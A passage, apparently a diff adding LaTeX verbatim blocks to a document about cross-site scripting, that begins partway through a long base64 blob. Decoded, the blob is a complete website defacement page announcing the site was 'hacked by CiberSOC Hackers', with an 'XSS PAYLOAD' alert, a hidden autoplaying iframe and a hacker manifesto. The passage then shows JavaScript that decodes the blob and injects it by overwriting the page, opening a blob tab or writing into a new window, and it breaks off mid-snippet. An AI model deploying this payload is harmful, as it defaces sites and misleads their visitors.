Fucy1zZXJpZjsKICAgIGhlaWdodDo1MHB4OwogICAgcG9zaXRpb246cmVsYXRpdmU7CiAgICB6LWluZGV4OjU7Cn0KaDF7CiAgICBtYXJnaW4tdG9wOiAzMHB4OwogICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgY29sb3I6IHdoaXRlOwogICAgZm9udC1mYW1pbHk6IE5vc2lmZXI7CiAgICB0ZXh0LXNoYWRvdzogMCAwIDAuNWVtIHJlZCwgMCAwIDAuNWVtIHJlZDsKfQoKLndlLWFyZSB7CiAgICBjb2xvcjogcmVkOwogICAgZm9udC1zaXplOiAyMHB4OwogICAgdGV4dC1zaGFkb3c6ICMwMDAgMnB4IDJweCAycHg7CiAgICBsZXR0ZXItc3BhY2luZzogMnB4Owp9CgoubWVzc2FnZSB7CiAgICBjb2xvcjogd2hpdGU7CiAgICAtd2Via2l0LWFuaW1hdGlvbjogZmFkZUluIDFzIGVhc2UtaW47CiAgICBhbmltYXRpb246IGZhZGVJbiAxcyBlYXNlLWluOwp9CgouY24gewogICAgY29sb3I6IHdoaXRlOwogICAgZm9udC1zaXplOiAxNHB4OwogICAgdGV4dC1zaGFkb3c6ICMwMDAgMnB4IDJweCAycHg7CiAgICBsZXR0ZXItc3BhY2luZzogMnB4OwogICAgLXdlYmtpdC1hbmltYXRpb246IGZhZGVJbiAzcyBlYXNlLWluOwogICAgYW5pbWF0aW9uOiBmYWRlSW4gMXMgZWFzZS1pbjsKfQoKLXdlYmtpdC1Aa2V5ZnJhbWVzIHdlLWFyZSB7CiAgICBmcm9tIHtzY2FsZTogMS4xO30KICAgIHRvIHtzY2FsZTogMDt9Cn0KCkBrZXlmcmFtZXMgd2UtYXJlIHsKICAgIGZyb20ge3NjYWxlOiAxLjE7fQogICAgdG8ge3NjYWxlOiAwO30KfQoKLXdlYmtpdC1Aa2V5ZnJhbWVzIGZhZGVJbiB7CiAgIDAlIHtvcGFjaXR5OiAwO30KICAgMTAwJSB7b3BhY2l0eTogMTt9Cn0gCgpAa2V5ZnJhbWVzIGZhZGVJbiB7CiAgIDAlIHtvcGFjaXR5OiAwO30KICAgMTAwJSB7b3BhY2l0eTogMTt9Cn0gCgpAa2V5ZnJhbWVzIG1vdmUtdHdpbmstYmFjayB7CiAgICBmcm9tIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOjAgMDt9CiAgICB0byB7YmFja2dyb3VuZC1wb3NpdGlvbjotMTAwMDBweCA1MDAwcHg7fQp9CkAtd2Via2l0LWtleWZyYW1lcyBtb3ZlLXR3aW5rLWJhY2sgewogICAgZnJvbSB7YmFja2dyb3VuZC1wb3NpdGlvbjowIDA7fQogICAgdG8ge2JhY2tncm91bmQtcG9zaXRpb246LTEwMDAwcHggNTAwMHB4O30KfQpALW1vei1rZXlmcmFtZXMgbW92ZS10d2luay1iYWNrIHsKICAgIGZyb20ge2JhY2tncm91bmQtcG9zaXRpb246MCAwO30KICAgIHRvIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOi0xMDAwMHB4IDUwMDBweDt9Cn0KQC1tcy1rZXlmcmFtZXMgbW92ZS10d2luay1iYWNrIHsKICAgIGZyb20ge2JhY2tncm91bmQtcG9zaXRpb246MCAwO30KICAgIHRvIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOi0xMDAwMHB4IDUwMDBweDt9Cn0KCkBrZXlmcmFtZXMgbW92ZS1jbG91ZHMtYmFjayB7CiAgICBmcm9tIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOjAgMDt9CiAgICB0byB7YmFja2dyb3VuZC1wb3NpdGlvbjoxMDAwMHB4IDA7fQp9CkAtd2Via2l0LWtleWZyYW1lcyBtb3ZlLWNsb3Vkcy1iYWNrIHsKICAgIGZyb20ge2JhY2tncm91bmQtcG9zaXRpb246MCAwO30KICAgIHRvIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOjEwMDAwcHggMDt9Cn0KQC1tb3ota2V5ZnJhbWVzIG1vdmUtY2xvdWRzLWJhY2sgewogICAgZnJvbSB7YmFja2dyb3VuZC1wb3NpdGlvbjowIDA7fQogICAgdG8ge2JhY2tncm91bmQtcG9zaXRpb246MTAwMDBweCAwO30KfQpALW1zLWtleWZyYW1lcyBtb3ZlLWNsb3Vkcy1iYWNrIHsKICAgIGZyb20ge2JhY2tncm91bmQtcG9zaXRpb246IDA7fQogICAgdG8ge2JhY2tncm91bmQtcG9zaXRpb246MTAwMDBweCAwO30KfQoKLnN0YXJzLCAudHdpbmtsaW5nLCAuY2xvdWRzIHsKICBwb3NpdGlvbjphYnNvbHV0ZTsKICB0b3A6MDsKICBsZWZ0OjA7CiAgcmlnaHQ6MDsKICBib3R0b206MDsKICB3aWR0aDoxMDAlOwogIGhlaWdodDoxMDAlOwogIGRpc3BsYXk6YmxvY2s7Cn0KCi5zdGFycyB7CiAgYmFja2dyb3VuZDojMDAwIHVybChodHRwOi8vd3d3LnNjcmlwdC10dXRvcmlhbHMuY29tL2RlbW9zLzM2MC9pbWFnZXMvc3RhcnMucG5nKSByZXBlYXQgdG9wIGNlbnRlcjsKICB6LWluZGV4OjA7Cn0KCi50d2lua2xpbmd7CiAgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoaHR0cDovL3d3dy5zY3JpcHQtdHV0b3JpYWxzLmNvbS9kZW1vcy8zNjAvaW1hZ2VzL3R3aW5rbGluZy5wbmcpIHJlcGVhdCB0b3AgY2VudGVyOwogIHotaW5kZXg6MTsKCiAgLW1vei1hbmltYXRpb246bW92ZS10d2luay1iYWNrIDIwMHMgbGluZWFyIGluZmluaXRlOwogIC1tcy1hbmltYXRpb246bW92ZS10d2luay1iYWNrIDIwMHMgbGluZWFyIGluZmluaXRlOwogIC1vLWFuaW1hdGlvbjptb3ZlLXR3aW5rLWJhY2sgMjAwcyBsaW5lYXIgaW5maW5pdGU7CiAgLXdlYmtpdC1hbmltYXRpb246bW92ZS10d2luay1iYWNrIDIwMHMgbGluZWFyIGluZmluaXRlOwogIGFuaW1hdGlvbjptb3ZlLXR3aW5rLWJhY2sgMjAwcyBsaW5lYXIgaW5maW5pdGU7Cn0KCi5jbG91ZHN7CiAgICBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybChodHRwOi8vd3d3LnNjcmlwdC10dXRvcmlhbHMuY29tL2RlbW9zLzM2MC9pbWFnZXMvY2xvdWRzMy5wbmcpIHJlcGVhdCB0b3AgY2VudGVyOwogICAgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsKICAgIHotaW5kZXg6MzsKCiAgLW1vei1hbmltYXRpb246bW92ZS1jbG91ZHMtYmFjayAyMDBzIGxpbmVhciBpbmZpbml0ZTsKICAtbXMtYW5pbWF0aW9uOm1vdmUtY2xvdWRzLWJhY2sgMjAwcyBsaW5lYXIgaW5maW5pdGU7CiAgLW8tYW5pbWF0aW9uOm1vdmUtY2xvdWRzLWJhY2sgMjAwcyBsaW5lYXIgaW5maW5pdGU7CiAgLXdlYmtpdC1hbmltYXRpb246bW92ZS1jbG91ZHMtYmFjayAyMDBzIGxpbmVhciBpbmZpbml0ZTsKICBhbmltYXRpb246bW92ZS1jbG91ZHMtYmFjayAyMDBzIGxpbmVhciBpbmZpbml0ZTsKfQoKLmNvbnRhaW5lciB7CiAgaGVpZ2h0OiAxMDAlOwogIHdpZHRoOiAxMDAlOwogIGp1c3RpZnktY29udGVudDogY2VudGVyOwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgZGlzcGxheTogZmxleDsKfQoudGV4dCB7CiAgZm9udC13ZWlnaHQ6IDEwMDsKICBmb250LXNpemU6IDI4cHg7CiAgY29sb3I6ICNGQUZBRkE7CiAgZm9udC1mYW1pbHk6IEljZWxhbmQ7CiAgdGV4dC1zaGFkb3c6IDAgMCAwLjVlbSBjeWFuLCAwIDAgMC41ZW0gY3lhbjsKICAKfQouZHVkIHsKICBjb2xvcjogIzc1NzU3NTsKfQoKLmFuaW1hdGlvbi1jb250YWluZXIgewogIHBvc2l0aW9uOiBmaXhlZDsKICB0b3A6IDA7CiAgbGVmdDogMDsKICByaWdodDogMDsKICBib3R0b206IDA7CiAgei1pbmRleDogMTsKfQoKLmFuaW1hdGlvbi1jb250YWluZXIgc3BhbiB7CiAgY29sb3I6IHdoaXRlc21va2U7CiAgZGlzcGxheTogYmxvY2s7CiAgZm9udC1zaXplOiAxOHB4OwogIGZvbnQtZmFtaWx5OiAnSGVsdmV0aWNhJzsKICB0ZXh0LXNoYWRvdzogMCAwIDFweCB3aGl0ZTsKICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgdXNlci1zZWxlY3Q6IG5vbmU7CiAgcG9pbnRlci1ldmVudHM6IG5vbmU7CiAgY3Vyc29yOiBkZWZhdWx0OwogIHotaW5kZXg6IDE7CiAgb3BhY2l0eTogMDsKICB3aWxsLWNoYW5nZTogdHJhbnNmb3JtLCBvcGFjaXR5OwogIGFuaW1hdGlvbi10aW1pbmctZnVuY3Rpb246IGVhc2Utb3V0OwogIGFuaW1hdGlvbi1uYW1lOiBtb3ZlOwp9CgpAa2V5ZnJhbWVzIG1vdmUgewogIDAlIHsKICAgIG9wYWNpdHk6IDA7CiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMTAwdmgpOwogIH0KICAyNSUgewogICAgb3BhY2l0eTogMTsKICB9CiAgNTAlIHsKICAgIG9wYWNpdHk6IDE7CiAgfQogIDc1JSB7CiAgICBvcGFjaXR5OiAwOwogIH0KICAxMDAlIHsKICAgIG9wYWNpdHk6IDA7CiAgICB0cmFuc2Zvcm06IG5vbmU7CiAgfQp9Ci5idXp6X3dyYXBwZXJ7CiAgcG9zaXRpb246cmVsYXRpdmU7CiAgd2lkdGg6MTAwJTsKICBtYXJnaW46MTgwcHggYXV0bzsKICBiYWNrZ3JvdW5kLWF0dGFjaG1lbnQ6IGZpeGVkOwogICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybChodHRwOi8vaS5pbWd1ci5jb20vOVFwSlBsRy5qcGcpOwogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMCAwOyAKICAgICAgICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0IDsgIAogICAgICAgIGJhY2tncm91bmQtc2l6ZTpjb3ZlcjsKICAgICAgICBvdmVyZmxvdyA6IGhpZGRlbjsKICBvdmVyZmxvdzpoaWRkZW47CiAgcGFkZGluZzoxMDBweDsKfQouc2NhbmxpbmV7CiAgd2lkdGg6MTAwJTsKICBkaXNwbGF5OmJsb2NrOwogIGJhY2tncm91bmQ6IzAwMDsKICBoZWlnaHQ6NHB4OwogIHBvc2l0aW9uOnJlbGF0aXZlOwogIHotaW5kZXg6MzsKICBtYXJnaW4tYm90dG9tOjVweDsKICBvcGFjaXR5OjAuMTsKfQouYnV6el93cmFwcGVyIHNwYW57CiAgcG9zaXRpb246YWJzb2x1dGU7CiAgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMXB4KTsKICBmb250LXNpemU6MzBweDsKICBmb250LWZhbWlseTonQ291cmllciBuZXcnLCBmaXhlZDsKICBmb250LXdlaWdodDpib2xkOwp9Ci5idXp6X3dyYXBwZXIgc3BhbjpudGgtY2hpbGQoMSl7CiAgY29sb3I6cmVkOwogIG1hcmdpbi1sZWZ0Oi0ycHg7CiAgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMnB4KTsKfQouYnV6el93cmFwcGVyIHNwYW46bnRoLWNoaWxkKDIpewogIGNvbG9yOmdyZWVuOwogIG1hcmdpbi1sZWZ0OjJweDsKICAtd2Via2l0LWZpbHRlcjogYmx1cigycHgpOwp9Ci5idXp6X3dyYXBwZXIgc3BhbjpudGgtY2hpbGQoMyl7CiAgY29sb3I6Ymx1ZTsKICBwb3NpdGlvbjoyMHB4IDA7CiAgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMXB4KTsKfQouYnV6el93cmFwcGVyIHNwYW46bnRoLWNoaWxkKDQpewogIGNvbG9yOiNmZmY7CiAgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMXB4KTsKICB0ZXh0LXNoYWRvdzowIDAgNTBweCByZ2JhKDI1NSwyNTUsMjU1LDAuNCk7Cn0KLmJ1enpfd3JhcHBlciBzcGFuOm50aC1jaGlsZCg1KXsKICBjb2xvcjpyZ2JhKDI1NSwyNTUsMjU1LDAuNCk7CiAgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMTVweCk7Cn0KCi5idXp6X3dyYXBwZXIgc3BhbnsKICAtd2Via2l0LWFuaW1hdGlvbjogYmx1ciAzMG1zIGluZmluaXRlLCBqZXJrIDUwbXMgaW5maW5pdGU7Cn0KCkAtd2Via2l0LWtleWZyYW1lcyBibHVyIHsKICAwJSAgIHsgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMXB4KTsgb3BhY2l0eTowLjg7fQogIDUwJSB7IC13ZWJraXQtZmlsdGVyOiBibHVyKDFweCk7IG9wYWNpdHk6MTsgfQogIDEwMCV7IC13ZWJraXQtZmlsdGVyOiBibHVyKDFweCk7IG9wYWNpdHk6MC44OyB9Cn0KQC13ZWJraXQta2V5ZnJhbWVzIGplcmsgewogIDUwJSB7IGxlZnQ6MXB4OyB9CiAgNTElIHsgbGVmdDowOyB9Cn0KQC13ZWJraXQta2V5ZnJhbWVzIGplcmt1cCB7CiAgNTAlIHsgdG9wOjFweDsgfQogIDUxJSB7IHRvcDowOyB9Cn0KCi5idXp6X3dyYXBwZXIgc3BhbjpudGgtY2hpbGQoMyl7CiAgLXdlYmtpdC1hbmltYXRpb246IGplcmtibHVlIDFzIGluZmluaXRlOwp9CkAtd2Via2l0LWtleWZyYW1lcyBqZXJrYmx1ZSB7CiAgMCUgeyBsZWZ0OjA7IH0KICAzMCUgeyBsZWZ0OjA7IH0KICAzMSUgeyBsZWZ0OjEwcHg7IH0KICAzMiUgeyBsZWZ0OjA7IH0KICA5OCUgeyBsZWZ0OjA7IH0KICAxMDAlIHsgbGVmdDoxMHB4OyB9Cn0KLmJ1enpfd3JhcHBlciBzcGFuOm50aC1jaGlsZCgyKXsKICAtd2Via2l0LWFuaW1hdGlvbjogamVya2dyZWVuIDFzIGluZmluaXRlOwp9CkAtd2Via2l0LWtleWZyYW1lcyBqZXJrZ3JlZW4gewogIDAlIHsgbGVmdDowOyB9CiAgMzAlIHsgbGVmdDowOyB9CiAgMzElIHsgbGVmdDotMTBweDsgfQogIDMyJSB7IGxlZnQ6MDsgfQogIDk4JSB7IGxlZnQ6MDsgfQogIDEwMCUgeyBsZWZ0Oi0xMHB4OyB9Cn0KCi5idXp6X3dyYXBwZXIgLnRleHR7CiAgLXdlYmtpdC1hbmltYXRpb246IGplcmt3aG9sZSA1cyBpbmZpbml0ZTsKICBwb3NpdGlvbjpyZWxhdGl2ZTsKfQpALXdlYmtpdC1rZXlmcmFtZXMgamVya3dob2xlIHsKICAzMCUgeyAgfQogIDQwJSB7IG9wYWNpdHk6MTsgdG9wOjA7IGxlZnQ6MDsgIC13ZWJraXQtdHJhbnNmb3JtOnNjYWxlKDEsMSk7ICAtd2Via2l0LXRyYW5zZm9ybTpza2V3KDAsMCk7fQogIDQxJSB7IG9wYWNpdHk6MC44OyB0b3A6MHB4OyBsZWZ0Oi0xMDBweDsgLXdlYmtpdC10cmFuc2Zvcm06c2NhbGUoMSwxLjIpOyAgLXdlYmtpdC10cmFuc2Zvcm06c2tldyg1MGRlZywwKTt9CiAgNDIlIHsgb3BhY2l0eTowLjg7IHRvcDowcHg7IGxlZnQ6MTAwcHg7IC13ZWJraXQtdHJhbnNmb3JtOnNjYWxlKDEsMS4yKTsgIC13ZWJraXQtdHJhbnNmb3JtOnNrZXcoLTgwZGVnLDApO30KICA0MyUgeyBvcGFjaXR5OjE7IHRvcDowOyBsZWZ0OjA7IC13ZWJraXQtdHJhbnNmb3JtOnNjYWxlKDEsMSk7ICAtd2Via2l0LXRyYW5zZm9ybTpza2V3KDAsMCk7fQogIDY1JSB7IH0KfQoKPC9zdHlsZT4KCgogIAo8L2hlYWQ+Cgo8Ym9keT4KCiAgPGRpdiBzdHlsZT0icG9zaXRpb246IGZpeGVkOyB0b3A6IDc1cHg7IGxlZnQ6IC0yMjVweDsgd2lkdGg6IDYwMHB4OyBwYWRkaW5nOiAxMHB4OyBmb250LXNpemU6IDI0cHg7IHRleHQtYWxpZ246IGNlbnRlcjsgY29sb3I6IHdoaXRlOyBmb250LWZhbWlseTogJ3RyZWJ1Y2hldCBtcycsIHZlcmRhbmEsIGFyaWFsLCBzYW5zLXNlcmlmO3RyYW5zZm9ybTogcm90YXRlKC00NWRlZyk7dHJhbnNmb3JtLW9yaWdpbjogNTAlIDBweDstby10cmFuc2Zvcm06IHJvdGF0ZSgtNDVkZWcpOyAtby10cmFuc2Zvcm0tb3JpZ2luOiA1MCUgMHB4Oy1tb3otdHJhbnNmb3JtOiByb3RhdGUoLTQ1ZGVnKTsgLW1vei10cmFuc2Zvcm0tb3JpZ2luOiA1MCUgMHB4OyAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC00NWRlZyk7IC13ZWJraXQtdHJhbnNmb3JtLW9yaWdpbjogNTAlIDBweDsgYmFja2dyb3VuZC1jb2xvcjogVHJhbnNwYXJlbnQ7IGJvcmRlcjogMXB4IHNvbGlkIHJnYigxNzAsIDE3MCwgMTcwKTsgei1pbmRleDogOTk5OTsgb3BhY2l0eTogMC41OyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0NpYmVyU09DaGFja2Vycy5pbiIgc3R5bGU9InRleHQtZGVjb3JhdGlvbjpub25lO2NvbG9yOndoaXRlOyI+Q2liZXJTT0MgSGFja2VyczwvYT48L2Rpdj4KPGRpdiBjbGFzcz0ic3RhcnMiPgogIDxjZW50ZXI+CiAgICA8aDE+U2VpemVkIEJ5IENpYmVyU09DIEhhY2tlcnM8L2gxPgogIDwvY2VudGVyPgo8L2Rpdj4KPGRpdiBjbGFzcz0idHdpbmtsaW5nIj4KICA8Y2VudGVyPjxicj48YnI+PGJyPgogICAgPGltZyBzcmM9Imh0dHBzOi8vb25seXB1bHQuY29tL2Jsb2dfdXBsb2Fkcy8xNTEwODI1NjY0LTNmNDZlN2QzZDJiYzJkYjhiYzgzOGUzMmY3YTYyMTFkLnBuZyIgd2lkdGg9IjI1MCIvPjxicj4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgIDxkaXYgY2xhc3M9InRleHQiPjwvZGl2PgogICAgPC9kaXY+PGJyPjxicj48YnI+CiAgICA8Zm9udCBmYWNlPSJTYXJwYW5jaCIgY29sb3I9IndoaXRlIiBzaXplIjEwIiBjbGFzcz0ibWVzc2FnZSI+CiAgICAgIHwmbmJzcDsgIERlbW88Zm9udCBjb2xvcj0icmVkIj5vZiA8L2ZvbnQ+cGFnZSZuYnNwOyAgfAogICAgPC9mb250Pjxicj4KICAgIDxmb250IGZhY2U9IlNhcnBhbmNoIiBjb2xvcj0id2hpdGUiIHNpemUiMTAiIGNsYXNzPSJtZXNzYWdlIj4jSGFja2VkICZidWxsOyBZb3UgQXJlIEhhY2tlZCBCeSBDaWJlclNPQyBIYWNrZXJzIDxmb250IGNvbG9yPSJyZWQiPkFuIFRJQyBERUYgVGVhbS48L2ZvbnQ+PGJyPjxicj4KICAgIDxmb250IGZhY2U9IlBsYXkiPgogICAgICA8cCBjbGFzcz0id2UtYXJlIj48Yj5XRSA8Zm9udCBjb2xvcj0iY3lhbiI+QVJFPGZvbnQgY29sb3I9IndoaXRlIj46PC9iPjwvcD4KICAgIDwvZm9udD4KICAgIDxmb250IGZhY2U9IlBsYXkiIGNsYXNzPSJjbiI+CiAgICAgIC09IENJQkVSU09DXzNUSU4gPGZvbnQgY29sb3I9ImN5YW4iPnw8L2ZvbnQ+IENJQkVSU09DXzZUSU4gPGZvbnQgY29sb3I9ImN5YW4iPnw8L2ZvbnQ+IENJQkVSU09DXzdUSU4gPGZvbnQgY29sb3I9ImN5YW4iPnw8L2ZvbnQ+IENJQkVSU09DXzVUSU4gPS0KICAgIDwvZm9udD4KICA8L2NlbnRlcj4KPC9kaXY+CjxkaXYgY2xhc3M9ImNsb3VkcyI+CjwvZGl2Pgo8aWZyYW1lIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHNyYz0iaHR0cHM6Ly93d3cueW91dHViZS5jb20vZW1iZWQvTEFwUzlHMjJjSVU/cmVsPTAmYXV0b3BsYXk9MSIgZnJhbWVib3JkZXI9IjAiIGFsbG93ZnVsbHNjcmVlbj48L2lmcmFtZT4KICAKICAKCiAgICA8c2NyaXB0ICBzcmM9ImpzL2luZGV4LmpzIj48L3NjcmlwdD4KCiA8c2NyaXB0PgoKYWxlcnQoJ1hTUyBQQVlMT0FEJyk7CgogY2xhc3MgVGV4dFNjcmFtYmxlIHsKICBjb25zdHJ1Y3RvcihlbCkgewogICAgdGhpcy5lbCA9IGVsCiAgICB0aGlzLmNoYXJzID0gJyFAIyQlXiYqKClfLT0re306Inw8Pj8sLi87JwogICAgdGhpcy51cGRhdGUgPSB0aGlzLnVwZGF0ZS5iaW5kKHRoaXMpCiAgfQogIHNldFRleHQobmV3VGV4dCkgewogICAgY29uc3Qgb2xkVGV4dCA9IHRoaXMuZWwuaW5uZXJUZXh0CiAgICBjb25zdCBsZW5ndGggPSBNYXRoLm1heChvbGRUZXh0Lmxlbmd0aCwgbmV3VGV4dC5sZW5ndGgpCiAgICBjb25zdCBwcm9taXNlID0gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHRoaXMucmVzb2x2ZSA9IHJlc29sdmUpCiAgICB0aGlzLnF1ZXVlID0gW10KICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHsKICAgICAgY29uc3QgZnJvbSA9IG9sZFRleHRbaV0gfHwgJycKICAgICAgY29uc3QgdG8gPSBuZXdUZXh0W2ldIHx8ICcnCiAgICAgIGNvbnN0IHN0YXJ0ID0gTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogNDApCiAgICAgIGNvbnN0IGVuZCA9IHN0YXJ0ICsgTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogNDApCiAgICAgIHRoaXMucXVldWUucHVzaCh7IGZyb20sIHRvLCBzdGFydCwgZW5kIH0pCiAgICB9CiAgICBjYW5jZWxBbmltYXRpb25GcmFtZSh0aGlzLmZyYW1lUmVxdWVzdCkKICAgIHRoaXMuZnJhbWUgPSAwCiAgICB0aGlzLnVwZGF0ZSgpCiAgICByZXR1cm4gcHJvbWlzZQogIH0KICB1cGRhdGUoKSB7CiAgICBsZXQgb3V0cHV0ID0gJycKICAgIGxldCBjb21wbGV0ZSA9IDAKICAgIGZvciAobGV0IGkgPSAwLCBuID0gdGhpcy5xdWV1ZS5sZW5ndGg7IGkgPCBuOyBpKyspIHsKICAgICAgbGV0IHsgZnJvbSwgdG8sIHN0YXJ0LCBlbmQsIGNoYXIgfSA9IHRoaXMucXVldWVbaV0KICAgICAgaWYgKHRoaXMuZnJhbWUgPj0gZW5kKSB7CiAgICAgICAgY29tcGxldGUrKwogICAgICAgIG91dHB1dCArPSB0bwogICAgICB9IGVsc2UgaWYgKHRoaXMuZnJhbWUgPj0gc3RhcnQpIHsKICAgICAgICBpZiAoIWNoYXIgfHwgTWF0aC5yYW5kb20oKSA8IDAuMjgpIHsKICAgICAgICAgIGNoYXIgPSB0aGlzLnJhbmRvbUNoYXIoKQogICAgICAgICAgdGhpcy5xdWV1ZVtpXS5jaGFyID0gY2hhcgogICAgICAgIH0KICAgICAgICBvdXRwdXQgKz0gJzxzcGFuIGNsYXNzPSJkdWQiPlwke2NoYXJ9PC9zcGFuPicKICAgICAgfSBlbHNlIHsKICAgICAgICBvdXRwdXQgKz0gZnJvbQogICAgICB9CiAgICB9CiAgICB0aGlzLmVsLmlubmVySFRNTCA9IG91dHB1dAogICAgaWYgKGNvbXBsZXRlID09PSB0aGlzLnF1ZXVlLmxlbmd0aCkgewogICAgICB0aGlzLnJlc29sdmUoKQogICAgfSBlbHNlIHsKICAgICAgdGhpcy5mcmFtZVJlcXVlc3QgPSByZXF1ZXN0QW5pbWF0aW9uRnJhbWUodGhpcy51cGRhdGUpCiAgICAgIHRoaXMuZnJhbWUrKwogICAgfQogIH0KICByYW5kb21DaGFyKCkgewogICAgcmV0dXJuIHRoaXMuY2hhcnNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogdGhpcy5jaGFycy5sZW5ndGgpXQogIH0KfQoKY29uc3QgcGhyYXNlcyA9IFsKICAnWWVzLCBXZSBhcmUgY3JpbWluYWwuJywKICAnT3VyIGNyaW1lIGlzIG91ciBjdXJpb3NpdHkuJywKICAnT3VyIGNyaW1lIGlzIHRoYXQgb2YganVkZ2luZyBwZW9wbGUgYnkgd2hhdCB0aGV5IHNheSBhbmQgdGhpbmssIG5vdCB3aGF0IHRoZXkgbG9vayBsaWtlLicsCiAgJ091ciBjcmltZSBpcyB0aGF0IG9mIG91dHNtYXJ0aW5nIHlvdSwgc29tZXRoaW5nIHRoYXQgeW91IHdpbGwgbmV2ZXIgZm9yZ2l2ZSB1cyBmb3IuJywKICAnV2UgYXJlIGhhY2tlcnMsIGFuZCB0aGlzIGlzIG91ciBtYW5pZmVzdG8uJywKICAnWW91IG1heSBzdG9wIHRoaXMgaW5kaXZpZHVhbCwgYnV0IHlvdSBjYW50IHN0b3AgdXMgYWxsLi4uJywKICAnYWZ0ZXIgYWxsLCB3ZXJlIGFsbCBhbGlrZS4nCl0KCmNvbnN0IGVsID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnRleHQnKQpjb25zdCBmeCA9IG5ldyBUZXh0U2NyYW1ibGUoZWwpCgpsZXQgY291bnRlciA9IDAKY29uc3QgbmV4dCA9ICgpID0+IHsKICBmeC5zZXRUZXh0KHBocmFzZXNbY291bnRlcl0pLnRoZW4oKCkgPT4gewogICAgc2V0VGltZW91dChuZXh0LCAxNTAwKQogIH0pCiAgY291bnRlciA9IChjb3VudGVyICsgMSkgJSBwaHJhc2VzLmxlbmd0aAp9CgpuZXh0KCkKCid1c2Ugc3RyaWN0JzsKCnZhciBhcHAgPSB7CgogIGNoYXJzOiBbJ0xhenkgSGFja2VycycsJ1NlaXplZCcsJzEyNy4wLjAuMScsJzEzMzcnLCcweDUyMzM0NCcsJ0xvY2FsaG9zdCcsJ1NoNGQwdyBQcjB4JywnSEFDS0VEIScsJ1NlY3VyaXR5JywnQnJlYWNoZWQhJywnU3lzdGVtJ10sCgogIGluaXQ6IGZ1bmN0aW9uICgpIHsKICAgIGFwcC5jb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIGFwcC5jb250YWluZXIuY2xhc3NOYW1lID0gJ2FuaW1hdGlvbi1jb250YWluZXInOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhcHAuY29udGFpbmVyKTsKICAgIHdpbmRvdy5zZXRJbnRlcnZhbChhcHAuYWRkLCAxMDApOwogIH0sCgogIGFkZDogZnVuY3Rpb24gKCkgewogICAgdmFyIGVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzcGFuJyk7CiAgICBhcHAuY29udGFpbmVyLmFwcGVuZENoaWxkKGVsZW1lbnQpOwogICAgYXBwLmFuaW1hdGUoZWxlbWVudCk7CiAgfSwKCiAgYW5pbWF0ZTogZnVuY3Rpb24gKGVsZW1lbnQpIHsKICAgIHZhciBjaGFyYWN0ZXIgPSBhcHAuY2hhcnNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogYXBwLmNoYXJzLmxlbmd0aCldOwogICAgdmFyIGR1cmF0aW9uID0gTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogMTUpICsgMTsKICAgIHZhciBvZmZzZXQgPSBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAoNTAgLSBkdXJhdGlvbiAqIDIpKSArIDM7CiAgICB2YXIgc2l6ZSA9IDEwICsgKDE1IC0gZHVyYXRpb24pOwogICAgZWxlbWVudC5zdHlsZS5jc3NUZXh0ID0gJ3JpZ2h0Oicrb2Zmc2V0Kyd2dzsgZm9udC1zaXplOicrc2l6ZSsncHg7YW5pbWF0aW9uLWR1cmF0aW9uOicrZHVyYXRpb24rJ3MnOwogICAgZWxlbWVudC5pbm5lckhUTUwgPSBjaGFyYWN0ZXI7CiAgICB3aW5kb3cuc2V0VGltZW91dChhcHAucmVtb3ZlLCBkdXJhdGlvbiAqIDEwMDAsIGVsZW1lbnQpOwogIH0sCgogIHJlbW92ZTogZnVuY3Rpb24gKGVsZW1lbnQpIHsKICAgIGVsZW1lbnQucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChlbGVtZW50KTsKICB9LAoKfTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBhcHAuaW5pdCk7CiAgICA8L3NjcmlwdD4KCgo8L2JvZHk+Cgo8L2h0bWw+"
+\end{verbatim}
+
+\begin{verbatim}
+function b64_to_utf8(str) {
+  return decodeURIComponent(escape(window.atob(str)));
+}
+
+var code = b64_to_utf8(b64code);
+\end{verbatim}
+
+Current document overwrite:
+
+\begin{verbatim}
+document.write( code );
+\end{verbatim}
+
+New tab blob:
+
+\begin{verbatim}
+var blob = new Blob([code], {type: "text/html"});
+var url = window.URL.createObjectURL(blob);
+window.open(url);
+\end{verbatim}
+
+New tab iframe:
+
+\begin{verbatim}
+let newWindow = window.open("")
+newWindow.document.write(
